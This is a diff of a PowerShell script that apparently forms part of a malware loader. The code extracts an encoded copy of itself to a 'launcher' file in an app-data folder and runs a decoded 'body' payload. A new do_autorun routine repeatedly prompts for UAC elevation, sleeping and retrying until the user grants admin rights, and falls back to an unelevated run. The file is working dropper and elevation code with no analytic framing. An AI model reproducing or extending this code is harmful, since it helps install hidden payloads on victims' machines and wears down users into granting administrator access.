@@ -1,14 +1,5 @@
 . ./utils.ps1
-. ./holder/consts_autoextract.ps1
 . ./consts_body.ps1
-
-function checkFolder {
-    $appDataFolder = Get-HephaestusFolder
-    if (-not (Test-Path -Path $appDataFolder))
-    {
-        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
-    }
-}
 
 $globalScriptPaths = @(
     #$MyInvocation.MyCommand.Definition,
@@ -29,13 +20,13 @@ function Get-ScriptPath {
     }
 }
 
-function extract_holder()
+function extract_launcher()
 {
     try
     {
         
 
-        $holderFile = Get-HolderPath
+        $launcherFile = Get-LauncherPath
         if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
         {
             $random = '###random'
@@ -54,12 +45,12 @@ function extract_holder()
             [void]$sb.AppendLine("")
             [void]$sb.AppendLine($content)
             $content = $sb.ToString()
-            $folderPath = [System.IO.Path]::GetDirectoryName($holderFile)
+            $folderPath = [System.IO.Path]::GetDirectoryName($launcherFile)
             if (-not (Test-Path -Path $folderPath)) {
                 New-Item -Path $folderPath -ItemType Directory
             }
-            [System.IO.File]::WriteAllText($holderFile, $content)
-            writedbg "extract_holder encodedScript"
+            [System.IO.File]::WriteAllText($launcherFile, $content)
+            writedbg "extract_launcher encodedScript"
 
             return
         }
@@ -69,14 +60,14 @@ function extract_holder()
             $pathOrData = $global:MyInvocation.MyCommand.Definition
             if ($pathOrData.Length -gt 500)
             {
-                writedbg "extract_holder pathOrData"
-                [System.IO.File]::WriteAllText($holderFile, $pathOrData)
+                writedbg "extract_launcher pathOrData"
+                [System.IO.File]::WriteAllText($launcherFile, $pathOrData)
             } 
             else 
             {
-                if ($curScript -ne $holderFile)
+                if ($curScript -ne $launcherFile)
                 {
-                    Copy-Item -Path $curScript -Destination $holderFile -Force
+                    Copy-Item -Path $curScript -Destination $launcherFile -Force
                 }
             } 
         }
@@ -105,23 +96,49 @@ function extract_holder()
     }
 }
 
-function extract_body()
+function do_autorun()
 {
-    $holderBodyFile = Get-BodyPath
-    $dir = [System.IO.Path]::GetDirectoryName($holderBodyFile)
-    if (-not (Test-Path -Path $dir)) {
-        New-Item -Path $dir -ItemType Directory -Force | Out-Null
+    extract_launcher
+    $body = (Get-BodyPath)
+    if ($server.aggressiveAdmin)
+    {
+        $elevated = IsElevated
+        if ($elevated)
+        {
+            writedbg "running elevated body path in aggressive admin"
+            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true
+        } 
+        else 
+        {
+            $attempt = GetArgInt("attempt")
+            $attempt = $attempt + 1
+            if ($attempt -ne 1)
+            {
+                $sleep = $server.aggressiveAdminDelay
+                writedbg "Not elevated, sleeping: $sleep"
+                Start-Sleep -Seconds $sleep
+            }
+            writedbg "aggressive admin: one UAC to elevate body (no separate holder)"
+            try {
+                RunMe -script $body -repassArgs $false -argName "attempt" -argValue $attempt -uac $true
+            }
+            catch {
+                writedbg "RunMe (elevate body) failed: $_"
+            }
+        }
     }
-    # Always refresh: skipping when the file exists left a stale body (e.g. no cert) after holder updates.
-    CustomDecode -inContent $xbody -outFile $holderBodyFile
+    else 
+    {
+        writedbg "No aggresive admin"
+        try 
+        {
+            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
+        }
+        catch {
+            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
+        }
+    }
+
 }
 
-function Initialization() 
-{
-    writedbg "holder initialization"
-    checkFolder
-    extract_holder
-    extract_body
-}
-
-Initialization
+do_autorun
